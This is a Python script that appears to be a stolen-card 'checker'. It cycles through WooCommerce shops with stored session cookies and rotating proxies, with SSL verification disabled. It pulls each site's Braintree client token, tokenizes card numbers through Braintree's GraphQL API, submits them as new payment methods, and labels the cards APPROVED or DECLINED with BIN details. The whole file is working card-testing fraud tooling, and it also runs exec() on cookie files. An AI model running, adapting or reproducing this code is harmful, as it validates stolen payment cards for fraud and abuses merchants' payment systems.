import requests
import re
import base64
from bs4 import BeautifulSoup
from user_agent import generate_user_agent
import time
import json
from datetime import datetime
import random
import urllib3
import sys
import io
import codecs
import os
import glob

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Global variables to store site and cookie info
SITES = []
SELECTED_SITE_INFO = None

def discover_cookie_pairs():
    """Discover available cookie pairs in cookies/ directory"""
    try:
        # Find all cookie files in cookies/ directory
        pattern1 = 'cookies/cookies_*-1.txt'
        pattern2 = 'cookies/cookies_*-2.txt'
        
        files1 = glob.glob(pattern1)
        files2 = glob.glob(pattern2)
        
        # Extract the pair identifiers (e.g., "1" from "cookies_1-1.txt")
        pairs = []
        for file1 in files1:
            filename = os.path.basename(file1)
            # Extract numeric ID from filename (e.g., "1" from "cookies_1-1.txt")
            try:
                pair_id = filename.split('_')[1].split('-')[0]
            except:
                continue
            
            file2_expected = f'cookies/cookies_{pair_id}-2.txt'
            
            # Check if file2 exists
            if any(f.endswith(f'cookies_{pair_id}-2.txt') for f in files2):
                pairs.append({
                    'id': pair_id,
                    'file1': filename,
                    'file2': f'cookies_{pair_id}-2.txt'
                })
        
        return pairs
    except Exception as e:
        print(f"Error discovering cookie pairs: {str(e)}")
        return []

def load_sites_and_cookies():
    """Load sites from site.txt file and map to cookie pairs."""
    global SITES
    try:
        # Read sites from site.txt if exists
        site_urls = []
        if os.path.exists('site.txt'):
            with open('site.txt', 'r') as f:
                site_urls = [line.strip() for line in f.read().splitlines() if line.strip()]
            print(f"Loaded {len(site_urls)} sites from site.txt")
        else:
            # Fallback to environment variable
            site_env = os.environ.get('SITE_URLS', '')
            if site_env:
                site_urls = [url.strip() for url in site_env.split(',') if url.strip()]
                print(f"Loaded {len(site_urls)} sites from environment variable")
        
        cookie_pairs = discover_cookie_pairs()
        print(f"Discovered {len(cookie_pairs)} cookie pairs")
        
        # Map sites to cookie pairs by index
        for i, url in enumerate(site_urls):
            pair_id_to_find = str(i + 1)
            matching_pair = next((p for p in cookie_pairs if p['id'] == pair_id_to_find), None)
            
            if matching_pair:
                SITES.append({
                    'url': url,
                    'cookie_pair': matching_pair
                })
                print(f"Mapped site {url} to cookie pair {matching_pair['id']}")
            else:
                print(f"Warning: No cookie pair found for site {url} (expected pair ID: {pair_id_to_find})")

        print(f"Total sites configured: {len(SITES)}")

    except Exception as e:
        print(f"Error loading sites and cookies: {str(e)}")

def select_random_site():
    """Select a random site and its cookie pair."""
    global SELECTED_SITE_INFO
    if not SITES:
        load_sites_and_cookies()
    
    if SITES:
        SELECTED_SITE_INFO = random.choice(SITES)
        print(f"🎲 Selected site: {SELECTED_SITE_INFO['url']} with cookie pair {SELECTED_SITE_INFO['cookie_pair']['id']}")
    else:
        print("Error: No sites configured.")
        SELECTED_SITE_INFO = None

def get_domain_url():
    """Get the URL of the currently selected site."""
    if SELECTED_SITE_INFO:
        return SELECTED_SITE_INFO['url']
    return ""

def read_cookies_from_file(filename):
    """Get cookies from environment variable or file in cookies/ directory"""
    try:
        # First try environment variables
        cookie_json = os.environ.get('COOKIE_' + filename.upper().replace('.', '_'))
        if cookie_json:
            return json.loads(cookie_json)
            
        # Fallback to local file in cookies directory
        filepath = os.path.join('cookies', filename)
        if os.path.exists(filepath):
            with open(filepath, 'r') as f:
                content = f.read()
                namespace = {}
                exec(content, namespace)
                return namespace.get('cookies', {})
                
        return {}
    except Exception as e:
        print(f"Error reading cookies for {filename}: {str(e)}")
        return {}

# Read cookies from the selected first cookie file
def get_cookies_1():
    if SELECTED_SITE_INFO:
        return read_cookies_from_file(SELECTED_SITE_INFO['cookie_pair']['file1'])
    return {}

# Read cookies from the selected second cookie file
def get_cookies_2():
    if SELECTED_SITE_INFO:
        return read_cookies_from_file(SELECTED_SITE_INFO['cookie_pair']['file2'])
    return {}

user = generate_user_agent()

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

def get_headers():
    """Get headers with current domain URL"""
    domain_url = get_domain_url()
    return {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'dnt': '1',
        'priority': 'u=0, i',
        'referer': f'{domain_url}/my-account/payment-methods/',
        'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'sec-gpc': '1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    }

def get_random_proxy():
    """Get a random proxy from environment variable or proxy.txt file"""
    try:
        # First try environment variable
        proxy_env = os.environ.get('PROXIES')
        if proxy_env:
            proxies = json.loads(proxy_env)
            if proxies:
                proxy = random.choice(proxies).strip()
                parts = proxy.split(':')
                if len(parts) == 4:
                    host, port, username, password = parts
                    return {
                        'http': f'http://{username}:{password}@{host}:{port}',
                        'https': f'http://{username}:{password}@{host}:{port}'
                    }
                    
        # Fallback to local proxy.txt file
        if os.path.exists('proxy.txt'):
            with open('proxy.txt', 'r') as f:
                proxies = f.readlines()
                if proxies:
                    proxy = random.choice(proxies).strip()
                    parts = proxy.split(':')
                    if len(parts) == 4:
                        host, port, username, password = parts
                        return {
                            'http': f'http://{username}:{password}@{host}:{port}',
                            'https': f'http://{username}:{password}@{host}:{port}'
                        }
        return None
    except Exception as e:
        print(f"Error getting proxies: {str(e)}")
        return None

def get_random_address():
    """Generate a random address"""
    return {
        'postalCode': str(random.randint(10000, 99999)),
        'streetAddress': f'{random.randint(1, 999)} {random.choice(["Street", "Avenue", "Boulevard", "Drive"])}'
    }

def get_new_auth():
    """Get fresh authorization tokens"""
    domain_url = get_domain_url()  # Read fresh domain URL
    cookies_1 = get_cookies_1()    # Read fresh cookies
    headers = get_headers()        # Get headers with current domain
    
    proxy = get_random_proxy()
    response = requests.get(
        f'{domain_url}/my-account/add-payment-method/',
        cookies=cookies_1,
        headers=headers,
        proxies=proxy,
        verify=False
    )
    if response.status_code == 200:
        # Get add_nonce
        add_nonce = re.findall('name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
        if not add_nonce:
            print("Error: Nonce not found in response")
            return None, None

        # Get authorization token
        i0 = response.text.find('wc_braintree_client_token = ["')
        if i0 != -1:
            i1 = response.text.find('"]', i0)
            token = response.text[i0 + 30:i1]
            try:
                decoded_text = base64.b64decode(token).decode('utf-8')
                au = re.findall(r'"authorizationFingerprint":"(.*?)"', decoded_text)
                if not au:
                    print("Error: Authorization fingerprint not found")
                    return None, None
                return add_nonce[0], au[0]
            except Exception as e:
                print(f"Error decoding token: {str(e)}")
                return None, None
        else:
            print("Error: Client token not found in response")
            return None, None
    else:
        print(f"Error: Failed to fetch payment page, status code: {response.status_code}")
        return None, None

def get_bin_info(bin_number):
    try:
        response = requests.get(f'https://api.voidex.dev/api/bin?bin={bin_number}', timeout=10)
        if response.status_code == 200:
            data = response.json()

            # Check if we have valid data
            if not data or 'brand' not in data:
                return {
                    'brand': 'UNKNOWN',
                    'type': 'UNKNOWN',
                    'level': 'UNKNOWN',
                    'bank': 'UNKNOWN',
                    'country': 'UNKNOWN',
                    'emoji': '🏳️'
                }

            # Return data mapped from Voidex API response
            return {
                'brand': data.get('brand', 'UNKNOWN'),
                'type': data.get('type', 'UNKNOWN'),
                'level': data.get('brand', 'UNKNOWN'),  # Using brand as level fallback
                'bank': data.get('bank', 'UNKNOWN'),
                'country': data.get('country_name', 'UNKNOWN'),
                'emoji': data.get('country_flag', '🏳️')
            }

        return {
            'brand': 'UNKNOWN',
            'type': 'UNKNOWN',
            'level': 'UNKNOWN',
            'bank': 'UNKNOWN',
            'country': 'UNKNOWN',
            'emoji': '🏳️'
        }
    except Exception as e:
        print(f"BIN lookup error: {str(e)}")
        return {
            'brand': 'UNKNOWN',
            'type': 'UNKNOWN',
            'level': 'UNKNOWN',
            'bank': 'UNKNOWN',
            'country': 'UNKNOWN',
            'emoji': '🏳️'
        }

def check_status(result):
    # First, check if the message contains "Reason:" and extract the specific reason
    if "Reason:" in result:
        # Extract everything after "Reason:"
        reason_part = result.split("Reason:", 1)[1].strip()

        # Check if it's one of the approved patterns
        approved_patterns = [
            'Nice! New payment method added',
            'Payment method successfully added.',
            'Insufficient Funds',
            'Duplicate',
            'Payment method added successfully',
            'Invalid postal code or street address',
            'You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds',
        ]

        cvv_patterns = [
            'CVV',
            'Gateway Rejected: avs_and_cvv',
            'Card Issuer Declined CVV',
            'Gateway Rejected: cvv'
        ]

        # Check if the extracted reason matches approved patterns
        for pattern in approved_patterns:
            if pattern in result:
                return "APPROVED", "Approved", True

        # Check if the extracted reason matches CVV patterns
        for pattern in cvv_patterns:
            if pattern in reason_part:
                return "DECLINED", "Reason: CVV", False

        # Return the extracted reason for declined cards
        return "DECLINED", reason_part, False

    # If "Reason:" is not found, use the original logic
    approved_patterns = [
        'Nice! New payment method added',
        'Payment method successfully added.',
        'Insufficient Funds',
        'Duplicate',
        'Payment method added successfully',
        'Invalid postal code or street address',
        'You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds',
    ]

    cvv_patterns = [
        'Reason: CVV',
        'Gateway Rejected: avs_and_cvv',
        'Card Issuer Declined CVV',
        'Gateway Rejected: cvv'
    ]

    for pattern in approved_patterns:
        if pattern in result:
            return "APPROVED", "Approved", True

    for pattern in cvv_patterns:
        if pattern in result:
            return "DECLINED", "Reason: CVV", False

    return "DECLINED", result, False

# Global counter for round-robin site selection
current_site_index = 0

def get_next_site():
    """Get the next site in round-robin order"""
    global current_site_index
    if not SITES:
        load_sites_and_cookies()
    
    if not SITES:
        print("Error: No sites configured.")
        return None
        
    site_info = SITES[current_site_index]
    current_site_index = (current_site_index + 1) % len(SITES)
    return site_info

def check_card(cc_line):
    # Get next site in round-robin order
    global SELECTED_SITE_INFO
    SELECTED_SITE_INFO = get_next_site()
    if not SELECTED_SITE_INFO:
        return {
            'status': 'ERROR',
            'card': cc_line,
            'response': 'No site selected. Check site.txt and cookie files.',
            'gateway': 'N/A',
            'bin_info': {},
            'time_taken': "0.00 seconds",
            'is_approved': False
        }
    
    print(f"🔁 Using site: {SELECTED_SITE_INFO['url']} with cookie pair {SELECTED_SITE_INFO['cookie_pair']['id']}")
    
    start_time = time.time()

    try:
        domain_url = get_domain_url()  # Read fresh domain URL
        if not domain_url:
            return {
                'status': 'ERROR',
                'card': cc_line,
                'response': 'No site selected. Check site.txt and cookie files.',
                'gateway': 'N/A',
                'bin_info': {},
                'time_taken': f"{time.time() - start_time:.2f} seconds",
                'is_approved': False
            }
            
        cookies_2 = get_cookies_2()    # Read fresh cookies
        headers = get_headers()        # Get headers with current domain
        
        add_nonce, au = get_new_auth()
        if not add_nonce or not au:
            return {
                'status': 'ERROR',
                'card': cc_line,
                'response': 'Authorization failed. Try again later.',
                'gateway': 'N/A',
                'bin_info': {},
                'time_taken': f"{time.time() - start_time:.2f} seconds",
                'is_approved': False
            }

        n, mm, yy, cvc = cc_line.strip().split('|')
        if not yy.startswith('20'):
            yy = '20' + yy

        random_address = get_random_address()
        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'cc600ecf-f0e1-4316-ac29-7ad78aeafccd',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': n,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvc,
                        'billingAddress': {
                            'postalCode': random_address['postalCode'],
                            'streetAddress': random_address['streetAddress'],
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        headers_token = {
            'authorization': f'Bearer {au}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'user-agent': user
        }

        proxy = get_random_proxy()
        response = requests.post(
            'https://payments.braintree-api.com/graphql',
            headers=headers_token,
            json=json_data,
            proxies=proxy,
            verify=False
        )

        if response.status_code != 200:
            return {
                'status': 'ERROR',
                'card': cc_line,
                'response': f"Tokenization failed. Status: {response.status_code}",
                'gateway': 'N/A',
                'bin_info': {},
                'time_taken': f"{time.time() - start_time:.2f} seconds",
                'is_approved': False
            }

        token = response.json()['data']['tokenizeCreditCard']['token']

        headers_submit = headers.copy()
        headers_submit['content-type'] = 'application/x-www-form-urlencoded'

        data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': token,
            'braintree_cc_device_data': '{"correlation_id":"cc600ecf-f0e1-4316-ac29-7ad78aea"}',
            'woocommerce-add-payment-method-nonce': add_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }

        proxy = get_random_proxy()
        response = requests.post(
            f'{domain_url}/my-account/add-payment-method/',
            cookies=cookies_2,  # Use fresh cookies
            headers=headers,
            data=data,
            proxies=proxy,
            verify=False
        )

        elapsed_time = time.time() - start_time
        soup = BeautifulSoup(response.text, 'html.parser')
        error_div = soup.find('div', class_='woocommerce-notices-wrapper')
        message = error_div.get_text(strip=True) if error_div else "❌ Unknown error"

        status, reason, approved = check_status(message)
        bin_info = get_bin_info(n[:6]) or {}

        return {
            'status': status,
            'card': cc_line,
            'response': reason,
            'gateway': f'Braintree Auth {SELECTED_SITE_INFO["cookie_pair"]["id"]}',
            'bin_info': {
                'brand': bin_info.get('brand', 'UNKNOWN'),
                'type': bin_info.get('type', 'UNKNOWN'),
                'level': bin_info.get('level', 'UNKNOWN'),
                'bank': bin_info.get('bank', 'UNKNOWN'),
                'country': bin_info.get('country', 'UNKNOWN'),
                'emoji': bin_info.get('emoji', '🏳️')
            },
            'time_taken': f"{elapsed_time:.2f} seconds",
            'is_approved': approved
        }

    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc_line,
            'response': str(e),
            'gateway': 'N/A',
            'bin_info': {},
            'time_taken': f"{time.time() - start_time:.2f} seconds",
            'is_approved': False
        }

# Add these lines right after the imports to properly handle Unicode output
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
